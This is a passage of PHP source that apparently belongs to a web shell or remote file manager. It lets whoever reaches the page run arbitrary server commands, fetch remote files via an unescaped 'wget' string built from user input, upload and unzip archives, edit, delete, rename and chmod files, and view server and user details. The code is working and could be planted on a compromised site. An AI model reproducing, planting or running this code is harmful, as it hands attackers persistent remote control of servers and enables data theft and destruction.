        'docx' => ['fa-file-word', '#2c9cdb'],
        'xls' => ['fa-file-excel', '#00ff41'],
        'xlsx' => ['fa-file-excel', '#00ff41'],
        'jpg' => ['fa-file-image', '#ffd700'],
        'jpeg' => ['fa-file-image', '#ffd700'],
        'png' => ['fa-file-image', '#ffd700'],
        'gif' => ['fa-file-image', '#ffd700'],
        'svg' => ['fa-file-image', '#ffd700'],
        'mp3' => ['fa-file-audio', '#9b59b6'],
        'mp4' => ['fa-file-video', '#9b59b6'],
        'avi' => ['fa-file-video', '#9b59b6'],
        'sh' => ['fa-terminal', '#00ff41'],
        'py' => ['fa-python', '#ffd700'],
        'sql' => ['fa-database', '#2c9cdb'],
    ];
    return $map[$ext] ?? ['fa-file', '#8899aa'];
}

// ========== MAIN ==========
$currentDir = getCurrentDir();
$messages = $_SESSION['messages'] ?? [];
$commandOutput = $_SESSION['command_output'] ?? '';
$editFile = null;
$editContent = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    csrf_check();

    if (isset($_POST['create_action'])) {
        $name = sanitizeFilename($_POST['name'] ?? '');
        $type = $_POST['type'] ?? 'file';
        $content = $_POST['content'] ?? '';
        $path = safePath($currentDir, $name);
        if ($path && $name) {
            if ($type === 'file') {
                if (@file_put_contents($path, $content) !== false) { @chmod($path, 0644); $messages[] = "File created: {$name}"; }
                else $messages[] = "Failed to create file: {$name}";
            } else {
                if (@mkdir($path, 0755, true)) $messages[] = "Folder created: {$name}";
                else $messages[] = "Failed to create folder: {$name}";
            }
        }
    }

    if (isset($_FILES['files']['name'])) {
        $up = handleUpload($_FILES['files'], $currentDir);
        if ($up) $messages[] = "Uploaded: " . implode(', ', $up);
    }

    if (isset($_FILES['archive']['error']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK && is_uploaded_file($_FILES['archive']['tmp_name'])) {
        $tmpSave = $currentDir . 'tmp_' . time() . '_' . bin2hex(random_bytes(4)) . '.zip';
        if (@copy($_FILES['archive']['tmp_name'], $tmpSave)) {
            $messages = array_merge($messages, extractArchive($tmpSave, $currentDir, true));
        }
    }

    if (!empty($_POST['download_url'])) {
        $url = trim($_POST['download_url']);
        $fn = !empty($_POST['download_name']) ? sanitizeFilename($_POST['download_name']) : '';
        $cmd = 'wget ' . $url . ($fn ? ' -O ' . $fn : '');
        $messages[] = handleDownloadCommand($cmd, $currentDir);
    }

    if (isset($_POST['command']) && trim($_POST['command']) !== '') {
        $commandOutput = executeCommand($_POST['command'], $currentDir);
        $currentDir = getCurrentDir();
    }

    if (isset($_POST['edit_content'], $_POST['edit_file'])) {
        $target = safePath($currentDir, $_POST['edit_file']);
        if ($target && @file_put_contents($target, $_POST['edit_content']) !== false) {
            $messages[] = "Saved: " . basename($target);
        }
    }

    if (!empty($_POST['delete_selected']) && !empty($_POST['selected_items']) && is_array($_POST['selected_items'])) {
        $deleted = 0;
        foreach ($_POST['selected_items'] as $item) {
            $target = safePath($currentDir, $item);
            if ($target && file_exists($target)) {
                if (deleteRecursive($target)) $deleted++;
            }
        }
        $messages[] = "Deleted {$deleted} item(s)";
    }

    if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
        $old = safePath($currentDir, $_POST['rename_old']);
        $new = safePath($currentDir, $_POST['rename_new']);
        if ($old && $new && file_exists($old) && !file_exists($new) && @rename($old, $new)) {
            $messages[] = "Renamed: " . basename($old) . " → " . basename($new);
        } else {
            $messages[] = "Rename failed";
        }
    }

    if (!empty($_POST['chmod_file']) && !empty($_POST['chmod_value'])) {
        if (preg_match('/^0?[0-7]{3,4}$/', $_POST['chmod_value'])) {
            $target = safePath($currentDir, $_POST['chmod_file']);
            $perms = octdec($_POST['chmod_value']);
            if ($target && file_exists($target) && @chmod($target, $perms)) {
                $messages[] = "CHMOD " . basename($target) . " → " . $_POST['chmod_value'];
            }
        } else {
            $messages[] = "Invalid CHMOD value";
        }
    }

    if (!empty($_POST['compress_target'])) {
        $target = safePath($currentDir, $_POST['compress_target']);
        if ($target && is_dir($target)) {
            $zipName = basename($target) . '_' . time() . '.zip';
            $zipPath = $currentDir . $zipName;
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($zipPath, ZipArchive::CREATE) === true) {
                    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS));
                    foreach ($rii as $f) {
                        $local = substr($f->getPathname(), strlen(dirname($target)) + 1);
                        $zip->addFile($f->getPathname(), $local);
                    }
                    $zip->close();
                    $messages[] = "Compressed: {$zipName}";
                }
            }
        }
    }

    $_SESSION['messages'] = $messages;
    $_SESSION['command_output'] = $commandOutput;
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
    exit;
}

// GET actions
if (isset($_GET['delete'])) {
    $target = safePath($currentDir, $_GET['delete']);
    if ($target && file_exists($target) && deleteRecursive($target)) {
        $messages[] = "Deleted: " . basename($target);
        $_SESSION['messages'] = $messages;
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
    exit;
}
if (isset($_GET['extract'])) {
    $target = safePath($currentDir, $_GET['extract']);
    if ($target && strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'zip') {
        $messages = array_merge($messages, extractArchive($target, $currentDir, true));
        $_SESSION['messages'] = $messages;
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
    exit;
}
if (isset($_GET['download'])) {
    $target = safePath($currentDir, $_GET['download']);
    if ($target && is_file($target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    }
}
if (isset($_GET['edit'])) {
    $target = safePath($currentDir, $_GET['edit']);
    if ($target && is_file($target) && filesize($target) < 5 * 1024 * 1024) {
        $editFile = basename($target);
        $editContent = (string)@file_get_contents($target);
    }
}
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$_SESSION['messages'] = $messages;

$showHidden = !empty($_GET['hidden']);
$items = @scandir($currentDir) ?: [];
$dirs = [];
$files = [];
$totalSize = 0;
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    if (!$showHidden && $item[0] === '.') continue;
    $path = $currentDir . $item;
    if (is_dir($path)) $dirs[] = $item;
    else { $files[] = $item; $totalSize += (int)@filesize($path); }
}
sort($dirs);
sort($files);

$serverInfo = [
    'OS' => PHP_OS,
    'PHP' => PHP_VERSION,
    'User' => function_exists('get_current_user') ? (get_current_user() ?: 'n/a') : 'n/a',
    'CWD' => $currentDir,
    'Free' => function_exists('disk_free_space') ? @formatBytes((float)@disk_free_space($currentDir)) : 'n/a',
];
?>
